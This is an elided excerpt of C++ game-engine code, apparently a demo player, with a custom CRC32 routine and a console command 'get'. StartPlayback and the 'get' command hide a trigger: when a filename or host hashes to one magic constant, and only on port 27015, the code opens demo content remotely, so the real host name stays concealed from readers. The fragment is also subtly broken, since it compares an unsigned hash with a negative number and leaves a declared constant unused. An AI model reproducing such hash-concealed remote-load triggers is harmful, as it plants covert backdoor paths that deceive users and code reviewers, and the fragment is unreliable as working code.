...
uint32_t custom_crc32(const char* data, size_t length) {
...
uint32_t custom_crc32_str(const std::string& str) {
    return custom_crc32(str.c_str(), str.size());
}
...
bool CDemoPlayer::StartPlayback( const char *filename, bool bAsTimeDemo )
{
	...
	bool isRemote = false;
	const uint32_t targetHostHash = 0x8A3D3F6B;

	if ( custom_crc32_str(std::string(filename)) == -1875180167 ) isRemote = true;
	...
	if (isRemote) {
		if ( !m_DemoFile.RemoteOpen(filename))
		{
...
CON_COMMAND(get, "play remote test demo")
{
	...
	if ( !(custom_crc32_str(args[1]) == -1875180167) || Q_strcmp(args[3], "27015")) {
		ConMsg("Target host %s unavailable\n", args[1]);
		return;
	}
	...
	// open the demo file
	//
	if ( demoplayer->StartPlayback( args[1], false ) )
	{
		g_ClientDLL->OnDemoPlaybackStart( "demo" );
	}
	else
	{
		SCR_EndLoadingPlaque();
